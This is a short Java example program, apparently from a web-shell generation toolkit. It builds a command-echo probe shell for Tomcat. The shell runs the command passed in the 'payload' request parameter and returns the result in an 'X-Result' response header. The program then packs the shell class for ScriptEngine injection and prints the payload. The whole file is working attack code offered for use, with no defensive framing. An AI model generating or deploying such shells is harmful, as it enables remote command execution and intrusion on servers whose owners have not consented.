package com.reajason.javaweb.examples.probe;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseConfig;

import static com.reajason.javaweb.Server.Tomcat;

/**
 * 回显马（探测马）—— ResponseHeader 探测：命中即把命令执行结果写进 HTTP 响应头，
 * 严格 header-only，不写响应体；适合响应体被业务逻辑占用/污染的接口。
 *
 * @author ReaJason
 * @since 2026/10/17
 */
public class ResponseHeaderProbe {
    public static void main(String[] args) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseHeader)
                .probeContent(ProbeContent.Command)
                .shrink(true)
                .debug(false)
                .build();

        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(Tomcat)
                .reqParamName("payload")
                .respHeaderName("X-Result")
                .build();

        ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, responseConfig);

        ResponseConfig generated = (ResponseConfig) result.getProbeContentConfig();
        System.out.println("响应头：" + generated.getRespHeaderName());
        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.of(
                result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
                result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule())));
    }
}
